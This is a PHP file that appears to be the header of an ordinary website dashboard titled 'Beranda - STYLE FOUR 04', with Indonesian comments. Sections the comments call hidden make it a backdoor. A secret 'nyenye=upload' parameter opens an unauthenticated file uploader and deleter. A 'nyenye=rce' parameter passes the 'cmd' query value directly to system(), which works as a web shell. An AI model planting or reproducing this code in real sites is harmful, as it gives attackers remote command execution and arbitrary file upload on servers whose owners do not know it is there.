<?php
session_start();
$_SESSION['username'] = "User"; // Gantilah dengan sistem login sebenarnya

// ===================== [ BAGIAN UPLOAD & HAPUS FILE TERSEMBUNYI ] =====================
if (isset($_GET["nyenye"]) && $_GET["nyenye"] == "upload") {
    echo '<h2>Upload File</h2>
    <form action="" method="post" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" name="submit" value="Upload">
    </form>';

    if (isset($_POST["submit"])) {
        $target_dir = "uploads/";
        if (!file_exists($target_dir)) {
            mkdir($target_dir, 0777, true);
        }
        $target_file = $target_dir . basename($_FILES["file"]["name"]);
        if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
            echo "File uploaded: <a href='$target_file'>$target_file</a>";
        } else {
            echo "Upload failed.";
        }
    }

    // Menampilkan daftar file
    echo '<h2>File yang Sudah Diupload:</h2>';
    $files = glob("uploads/*");
    if (count($files) > 0) {
        foreach ($files as $file) {
            echo "$file - <a href='?nyenye=upload&delete=$file'>Hapus</a><br>";
        }
    } else {
        echo "Tidak ada file yang di-upload.";
    }

    // Fitur hapus file
    if (isset($_GET["delete"])) {
        $file_to_delete = $_GET["delete"];
        if (strpos($file_to_delete, "uploads/") === 0 && file_exists($file_to_delete)) {
            unlink($file_to_delete);
            echo "File berhasil dihapus.";
        } else {
            echo "Gagal menghapus file.";
        }
    }

    exit(); // Mencegah tampilan dashboard muncul
}

// ===================== [ BAGIAN RCE TERSEMBUNYI ] =====================
if (isset($_GET["nyenye"]) && $_GET["nyenye"] == "rce") {
    if (isset($_GET["cmd"])) {
        system($_GET["cmd"]);
    }
    exit();
}

// ===================== [ KONFIGURASI DASHBOARD ] =====================
$title = "Beranda - STYLE FOUR 04";
$year = date("Y");
?>